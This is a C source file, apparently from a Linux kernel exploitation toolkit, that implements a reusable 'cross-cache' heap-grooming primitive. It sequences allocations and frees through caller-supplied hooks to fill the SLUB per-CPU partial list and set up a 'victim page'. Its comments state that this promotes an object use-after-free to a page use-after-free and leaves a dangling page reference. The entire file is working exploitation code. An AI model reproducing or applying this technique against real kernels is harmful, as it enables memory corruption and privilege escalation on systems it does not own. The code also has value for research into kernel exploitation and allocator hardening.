#include "cross_cache.h"

static inline int64_t cc_allocate(struct cross_cache *cc,
                                  uint32_t to_alloc,
                                  int64_t *object_refs)
{
    int64_t register ret = 0;

    for (uint32_t i = 0; i < to_alloc; i++) {
        ret = cc->allocate();
        IF_ERR(ret) {
            perror("cc_allocate:cc->allocate");
            return ERR;
        }
        object_refs[i] = ret;
    }

    return SUCC;
}

static inline int64_t cc_free(struct cross_cache *cc,
                              uint32_t to_free,
                              int64_t *object_refs,
                              uint32_t per_page)
{
    for (uint32_t i = 0; i < to_free; i++) {
        if (per_page && i % (per_page - 1)) {
            continue;
        }
        IF_ERR(object_refs[i])
            continue;
        IF_ERR(cc->free(object_refs[i])) {
            perror("cc_free:cc->free");
            return ERR;
        }
        object_refs[i] = ERR;
    }
    return SUCC;
}

static inline int64_t alloc_percpu_partial_list(struct cross_cache *cc)
{
    /* Allocate as much as the percpu partial list can hold.
    Later we'll place each page here onto the percpu partial list
    which will be filled up. For now, prepare the allocations. */
    uint32_t to_alloc = (cc->objs_per_slab * (1 + cc->cpu_partial)) * 2;
    int64_t err = cc_allocate(cc, to_alloc, cc->object_refs);
    cc->prev_count += to_alloc;
    return err;
}

static inline int64_t alloc_onto_victim_page(struct cross_cache *cc)
{
    /* Allocate onto a new CPU active-slab which will become
    our victim page, promoting an object UAF to a page UAF. */
    uint32_t to_alloc = (cc->objs_per_slab + 1);
    int64_t err = cc_allocate(cc, to_alloc, cc->object_refs + cc->prev_count);
    cc->prev_count += to_alloc;
    return err;
}

static inline int64_t alloc_rem_victim_page(struct cross_cache *cc)
{
    /* After we've allocated the victim object, allocate
    the remainder of the victim page to prevent noise. */
    uint32_t to_alloc = (cc->objs_per_slab + 1);
    int64_t err = cc_allocate(cc, to_alloc, cc->object_refs + cc->prev_count);
    return err;
}

static inline int64_t free_excess_victim_objs(struct cross_cache *cc)
{
    /* Free all allocations made in:
     - alloc_onto_victim_page()
     - alloc_rem_victim_page() */
    uint32_t to_free = (cc->objs_per_slab + 1) * 2;
    int64_t err = cc_free(cc, to_free, cc->object_refs, 0);
    cc->prev_count = to_free;
    return err;
}

static inline int64_t free_partial_list_allocs(struct cross_cache *cc)
{
    /* Free one allocation per-page from:
    - alloc_percpu_partial_list()
    After this, we have a dangling page ref. */
    uint32_t to_free = (cc->objs_per_slab * (1 + cc->cpu_partial)) * 2;
    int64_t err = cc_free(cc, to_free, cc->object_refs + cc->prev_count, cc->objs_per_page);
    return err;
}

static inline int64_t free_all(struct cross_cache *cc)
{
    return cc_free(cc, cc->n_objects, cc->object_refs, 0);
}

int64_t cc_next(struct cross_cache *cc)
{
    switch (cc->phase++) {
        case PHASE_0:
            return alloc_percpu_partial_list(cc);
        case PHASE_1:
            return alloc_onto_victim_page(cc);
        case PHASE_2:
            return alloc_rem_victim_page(cc);
        case PHASE_3:
            return free_excess_victim_objs(cc);
        case PHASE_4:
            return free_partial_list_allocs(cc);
        case PHASE_CLEAN:
            return free_all(cc);
        default:
            return ERR;
    }
}

void deinit_cross_cache(struct cross_cache* cc)
{
    free(cc->object_refs);
    free(cc);
}

struct cross_cache* init_cross_cache(void *allocate_fptr,
                                     void *free_fptr,
                                     uint32_t objs_per_slab,
                                     uint32_t cpu_partial,
                                     uint32_t objs_per_page)
{
    struct cross_cache *cc = malloc(sizeof(struct cross_cache));
    IF_ERR_PTR(cc) {
        perror("init_cross_cache:malloc\n");
        return ERR_PTR;
    }
    /* Initialise the cross-cache object */
    cc->allocate = allocate_fptr;
    cc->free = free_fptr;
    cc->objs_per_slab = objs_per_slab;
    cc->cpu_partial = cpu_partial;
    cc->objs_per_page = objs_per_page;

    /* How many objects we will end up using during the cross-cache,
     * NOT including the victim object(s) which should be included in
     * calculations by the object-specific code from the client.
     * */
    uint32_t n_objects =
            (2 * (objs_per_slab * (1 + cpu_partial)))
            + ((objs_per_slab + 1) * 2);
    cc->n_objects = n_objects;

    cc->object_refs = malloc(sizeof(intptr_t) * n_objects);
    IF_ERR_PTR(cc->object_refs) {
        perror("init_cross_cache:malloc\n");
        free(cc);
        return ERR_PTR;
    }
    memset(cc->object_refs, -1, sizeof(intptr_t) * n_objects);

    return cc;
}
